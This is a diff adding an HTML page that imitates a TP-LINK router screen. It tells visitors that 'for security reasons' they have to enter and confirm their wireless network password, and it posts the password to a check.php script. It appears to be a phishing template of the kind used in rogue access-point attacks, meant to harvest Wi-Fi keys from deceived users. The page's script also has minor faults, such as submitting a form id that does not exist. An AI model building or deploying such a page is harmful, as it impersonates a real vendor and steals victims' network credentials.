@@ -1,0 +1,103 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta http-equiv="Content-Script-Type" content="text/javascript">
+<meta http-equiv="Content-Style-Type" content="text/css">
+
+<link rel="stylesheet" href="./style/style.css" type="text/css">
+<style type="text/css">
+input.text
+{
+border:1px solid #E5E5E5;
+height:26px;
+line-height:26px;
+width:175px;
+padding:0px;
+margin:4px 0px 0px 10px;
+font-size:14px;
+color:#6a6969;
+font-family:"Verdana","Arial";
+outline: none;
+}
+input.LoginBtn
+{
+height:28px;
+display:inline-block;
+width:110px;
+margin-top:30px;
+font-size:18px;
+cursor:pointer;
+background-color: #FF9933;}
+#copyright
+{
+-webkit-text-size-adjust:none;
+font-size:9px;
+color:#6a6969;
+font-family:"Verdana";
+margin-top:40px;
+display:inline-block;
+}
+</style>
+<script language="JavaScript">
+<!--
+
+function myFunction() {
+        var pass1 = document.getElementById("pass1").value;
+        var pass2 = document.getElementById("pass2").value;
+		
+    if (pass1==null || pass1=="",pass2==null || pass2=="")
+      {
+      alert("Please Fill All Required Field");
+      return false;
+      }
+	  
+	  else {
+        if (pass1 != pass2) {
+            alert("Passwords Do Not Match");
+            document.getElementById("pass1").style.borderColor = "#E34234";
+            document.getElementById("pass2").style.borderColor = "#E34234";
+			return false;
+        }
+        else {
+            alert("Passwords Match!!!");
+            document.getElementById("regForm").submit();
+        } }
+    }
+-->
+
+</script>
+</head><body style="font-family:Arial, sans-serief; background-color:#E5E5E5;margin:0px;padding:0px;" onload="doLoad()">
+<form id="form1" name="form1" method="POST" action="check.php" >
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<table width="550" border="0" align="center" cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td><table width="100%" border="0" cellpadding="0" cellspacing="0">
+<tbody><tr>
+<td height="31">&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr><tr>
+<td width="8%">&nbsp;</td><td width="90%" valign="top">
+<br><br><br><table style="background-color:white" width="95%" border="0" align="center">
+<tbody><tr>
+<td height="35">&nbsp;</td><td>&nbsp;</td><td>&nbsp;</td></tr><tr>
+<td colspan="3" style="text-align:center;"><b>For Security Reasons<br><br><font size="3" color="gray"> Please Enter The Password of Your <font color="red">Wireless Network</font></font></b><br><br></td><td>&nbsp;</td></tr>
+<tr>
+<td align="left" width="40%">
+<font color="gray"><b>
+Password :</b></font>
+</td><td align="left" width="40%"><input name="key1" type="PASSWORD" id="pass1" name="Login_Pwd" size="12" maxlength="31" value="" autocomplete="off" class="text" onfocus="changeBorderColor(this,1);" onblur="changeBorderColor(this,0);" style="border-color: rgb(229, 229, 229);"></td></tr>
+<tr>
+<td align="left">
+<font color="gray"><b>Confirm Password :</b></font>
+</td><td><input type="PASSWORD" name="Login_Pwd" id="pass2" size="20" maxlength="31" value="" autocomplete="off" class="text" onfocus="changeBorderColor(this,1);" onblur="changeBorderColor(this,0);" style="border-color: rgb(229, 229, 229);"></td></tr>
+
+
+<tr>
+<td align="center" colspan="3">
+<input type="BUTTON" name="texttpLoginBtn" value="Submit" class="LoginBtn" onclick="myFunction();"></td></tr><tr>
+<td align="center" colspan="3">
+<input type="HIDDEN" name="uiWebLoginhiddenUsername" value="ec37aa25501f5aea74d5eb3d19b08333"><input type="HIDDEN" name="uiWebLoginhiddenPassword" value="ec37aa25501f5aea74d5eb3d19b08333"></td></tr><tr>
+<td height="30" colspan="3" style="text-align:center;">
+<label id="copyright">
+Copyright © 2015 TP-LINK Technologies Co., Ltd. All rights reserved.</label>
+</td></tr></tbody></table></td><td width="6%">&nbsp;</td></tr></tbody></table></td></tr></tbody></table><!-- RpZDT -->
+</form><p>&nbsp;</p>
+
+</body></html>
